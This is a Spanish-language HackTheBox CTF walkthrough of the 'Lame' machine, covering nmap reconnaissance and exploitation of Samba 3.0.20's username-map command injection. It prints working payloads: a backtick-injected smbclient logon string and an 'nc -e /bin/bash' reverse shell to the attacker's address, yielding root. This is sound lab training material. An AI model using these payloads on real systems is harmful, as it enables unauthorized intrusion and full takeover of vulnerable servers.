# WriteUp HackTheBox Lame

[Nota]: esta maquina fue realizada según el WriteUp realizado por S4vitar

## Descripción de la máquina

![Lame_Image](Images/Lame.png)

La resolución de la máquina presenta las siguiente fases:

* Reconocimiento
    * nmap
* Explotación
* Escalada de privilegios

## Fase de Reconocimiento

Se realiza una prueba de ping para confirmar que haya conexión con la máquina

> ping 10.10.10.3 -c1

```console
PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
64 bytes from 10.10.10.3: icmp_seq=1 ttl=63 time=136 ms
```

Para identificar el sistema operativo usamos la utilidad proporcionada por S4vitar whichSystem.py[^1]

[^1]: la utilidad se puede descargar de <https://github.com/Akronox/WichSystem.py>

> whichSystem.py 10.10.10.3

```console
10.10.10.3 (ttl -> 63): Linux
```

Se realiza una revisión de puertos con nmap con las siguientes opciones

* -p-: Para realizar el escaneo en todos los 65000 puertos TCP
* --open: Para reportar solamente los puertos que se encuentran abiertos
* -sS: TCP SYN port scan, este argumento se utiliza para realizar un escaneo rapido de puertos
* --min-rate: El argumento le exige a nmap realizar el escaneo con una tasa de paquetes por segundo no menor a la solicitada
* -vvv: triple verbose para mostrar más información
* -n: para que no realice resolución dns en el scaneo
* -Pn: Desabilita el descubrimiento del host a traves de ping
* -oG: exporta lo reportado en un archivo en formato grepeable

> sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.10.3 -oG nmap/allPorts

```console
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 23:02 -04
Initiating Parallel DNS resolution of 1 host. at 23:02
Completed Parallel DNS resolution of 1 host. at 23:02, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 23:02
Scanning 10.10.10.3 [65535 ports]
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 21/tcp on 10.10.10.3
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 22/tcp on 10.10.10.3
Discovered open port 3632/tcp on 10.10.10.3
Completed SYN Stealth Scan at 23:02, 26.42s elapsed (65535 total ports)
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.14s latency).
Scanned at 2022-08-22 23:02:07 -04 for 27s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
           Raw packets sent: 131083 (5.768MB) | Rcvd: 23 (1.012KB)
```

Por comodidad usamos la utilidad proporcionada por S4vitar extractPorts la cual nos ayuda a revisar el archivo creado por nmap 'all Ports' y nos copia los puertos en la clipboard para su posterior uso; se adjunta la utilidad a continuación

```console
extractPorts () {
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
        /bin/bat extractPorts.tmp
        rm extractPorts.tmp

```
> extracPorts nmap/allPorts

```console
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.3
   5   │     [*] Open ports: 21,22,139,445,3632
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
```

Se realiza un nuevo escaneo con una serie de scripts básicos que nmap nos ofrece para ver las técnologias que corren por detrás

> nmap -sCV -p21,22,139,445,3632  10.10.10.3 -oN nmap/targeted 

```console
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 23:10 -04
Nmap scan report for 10.10.10.3
Host is up (0.14s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-08-22T23:11:20-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h00m24s, deviation: 2h49m45s, median: 22s
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.35 seconds
```

## Fase de Explotación

Observamos la versión de vsftpd el cual tiene una vulnerabilidad

> searchsploit vsftpd 2.3.4

```console
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                  | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                     | unix/remote/17491.rb
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Sin embargo presenta un error al correr el script

> python2 vsftpd_2.3.4.py 10.10.10.3

```console
Traceback (most recent call last):
  File "vsftpd_2.3.4.py", line 37, in <module>
    tn2=Telnet(host, 6200)
  File "/usr/lib/python2.7/telnetlib.py", line 211, in __init__
    self.open(host, port, timeout)
  File "/usr/lib/python2.7/telnetlib.py", line 227, in open
    self.sock = socket.create_connection((host, port), timeout)
  File "/usr/lib/python2.7/socket.py", line 575, in create_connection
    raise err
socket.error: [Errno 110] Connection timed out
```

Por otra parte también observamos que se tiene un servicio samba 3.0.20 corriendo y que hay un exploit en searchsploit

> searchsploit Samba 3.0.20
```console
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                     | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                           | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                      | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                      | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                                              | linux_x86/dos/36741.py
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Revisando el codigo del exploit unix/remote/16320.rb observamos que se tiene una manera de ejecutar comandos en el sistema de la siguiente manera

```ruby
[...]
     def exploit
 
         connect
 
         # lol?
         username = "/=`nohup " + payload.encoded + "`"
         begin
[...]
```

Nos conectamos a samba

> smbclient -L 10.10.10.3 -N

```console
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```

Para resolver este error se añade los siguientes parámetros

> smbclient -L 10.10.10.3 -N --option 'client min protocol = NT1'

```console
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME
```

Por tanto probamos con el directorio /tmp y vemos que ganamos acceso

> smbclient //10.10.10.3/tmp -N --option 'client min protocol = NT1'

```console
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```

Verificando el exploit de ruby; Si nos ponemos en escucha a los paquetes ICMP por la interface tun0 y ejecutamos el siguiente comando vemos que tenemos ejecución remota de comandos

> sudo tcpdump -i tun0 icmp -n
```console
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
01:03:26.954541 IP 10.10.10.3 > 10.10.14.4: ICMP echo request, id 24856, seq 1, length 64
01:03:26.954566 IP 10.10.14.4 > 10.10.10.3: ICMP echo reply, id 24856, seq 1, length 64
```


> smb: \> logon "/=`nohup ping -c 1 10.10.14.4`"
> Password: 
```console
session setup failed: NT_STATUS_LOGON_FAILURE
```

Por tanto nos podenos en escucha en el puerto 443 y nos mandamos una reverse shell

> sudo nc -nlvp 443

```console
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.3] 57921
whoami
root
```


> smb: \> logon "/=`nohup nc -e /bin/bash 10.10.14.4 443`"
> Password: 

```console
session setup failed: NT_STATUS_IO_TIMEOUT
```

viendo que somos root ya se puede ver los archivos user.txt y root.txt


## Estructura del directorio

```
Lame
├── content
├── exploits
│   ├── sm_exploit.rb
│   └── vsftpd_2.3.4.py
├── Images
├── nmap
│   ├── allPorts
│   └── targeted
├── Readme.md
└── scripts
```
